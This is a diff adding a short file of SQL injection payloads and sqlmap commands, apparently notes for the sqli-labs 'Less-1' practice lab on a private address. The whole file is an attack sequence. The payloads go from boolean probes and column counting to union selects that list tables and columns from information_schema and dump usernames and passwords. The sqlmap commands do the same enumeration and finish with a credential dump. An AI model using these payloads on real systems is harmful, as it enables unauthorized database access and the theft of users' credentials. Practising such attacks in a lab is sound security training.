@@ -1,0 +1,16 @@
+id=1' and 1=1 --+
+id=1' and 1=2 --+
+id=1' order by 3 --+
+id=1' union select 1,2,3 --+
+id=1' union select 1,database(),version() --+
+id=1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
+id=1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
+id=1' union select 1,username,password from users --+ or (union select 1,2,group_concat(concat_ws(':',username,password)) from users --+)
+
+
+python2 sqlmap.py -u "http://192.168.1.1/sqli/Less-1/?id=2"
+python2 sqlmap.py -u "http://192.168.1.1/sqli/Less-1/?id=2" --current-db
+python2 sqlmap.py -u "http://192.168.1.1/sqli/Less-1/?id=2" -D security --tables
+python2 sqlmap.py -u "http://192.168.1.1/sqli/Less-1/?id=2" -D security -T users
+python2 sqlmap.py -u "http://192.168.1.1/sqli/Less-1/?id=2" -D security -T users --columns
+python2 sqlmap.py -u "http://192.168.1.1/sqli/Less-1/?id=2" -D security -T users -C username,password --dump
